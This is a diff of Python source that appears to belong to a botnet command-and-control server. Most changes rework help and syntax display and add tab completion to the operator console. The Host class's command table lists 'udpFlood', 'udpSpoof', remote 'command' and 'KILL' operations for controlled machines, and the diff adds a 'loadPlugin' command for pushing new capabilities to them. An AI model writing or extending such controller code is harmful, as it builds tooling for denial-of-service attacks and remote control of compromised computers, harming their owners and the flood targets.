@@ -59,10 +59,16 @@ class API(object):
         Temporary. Should interface Server's help when Circular references are removed.
         """
         help_dct = {}
+
         for cmd in Plugin.__server_cmds__:
-            help_dct[cmd] = {'help':Plugin.__server_cmds__[cmd].__doc__,
-                             'syntax':Plugin.__help__[cmd],
+            help_dct[cmd] = {'help':Plugin.__server_cmds__[cmd].__help__,
+                             'syntax':None,
                              'states':Plugin.__cmd_states__[cmd]}
+            try:
+                help_dct[cmd]["syntax"] = Plugin.__server_cmds__[cmd].__syntax__
+            except AttributeError:
+                pass
+
         return help_dct
 
     def refresh(self):
@@ -114,11 +120,13 @@ class Console(object):
     def loop(self):
         """Main CLI loop"""
         self._logo()
+        tab.readline_completer(c.title()
+                for c in Plugin.__cmd_states__.keys())
 
         while not self.server.quit_signal:
             try:
-                cmd = raw_input(Console.prompt)
-            except KeyboardInterrupt:
+                cmd = raw_input(Console.prompt).lower()
+            except (KeyboardInterrupt, EOFError):
                 raise KeyboardInterrupt
 
             cmdargs = cmd.split(" ")
@@ -394,17 +402,24 @@ class Server(object):
         """Print all the commands available in the current interface allong with
         their docsting."""
         help_str = ""
+
         if len(args) == 0:
             help_str += "Server commands:"
             if Plugin.__server_cmds__ is not None:
                 for cmd in Plugin.__server_cmds__:
                     if Console.state in Plugin.__cmd_states__[cmd]:
-                        help_str += ("\n\t%s: %s"\
-                                     % (cmd, Plugin.__server_cmds__[cmd].__doc__))
+                        # try:
+                            # help_str += ("\n\t%s %s: %s" % (cmd,
+                                # Plugin.__server_cmds__[cmd].__syntax__,
+                                # Plugin.__server_cmds__[cmd].__help__))
+                        # except AttributeError:
+                        help_str += ("\n\t%s: %s" % (cmd,
+                            Plugin.__server_cmds__[cmd].__help__))
+
         else:
             help_str += ("Command : %s" % args[0])
             try:
-                help_str += ("\nSyntax : %s" % Plugin.__help__[args[0]])
+                help_str += ("\nSyntax : %s" % Plugin.__server_cmds__[args[0]].__syntax__)
             except KeyError:
                 help_str += "\nCommand not found! Try help with no arguments for\
                              a list of all commands available in current scope."
@@ -438,7 +453,8 @@ class Host(object):
         'udpFlood'   : '00005',
         'udpSpoof'   : '00006',
         'command'    : '00007',
-        'KILL'       : '00008'
+        'KILL'       : '00008',
+        'loadPlugin' : '00009'
     }
 
     def __init__(self, sock, ip, port, h_id):
@@ -457,6 +473,7 @@ class Host(object):
         self.info["type"] = ""
         self.info["systemtype"] = ""
         self.info["hostname"] = ""
+        self.info["plugins"] = []
         ########################################################################
 
         try:
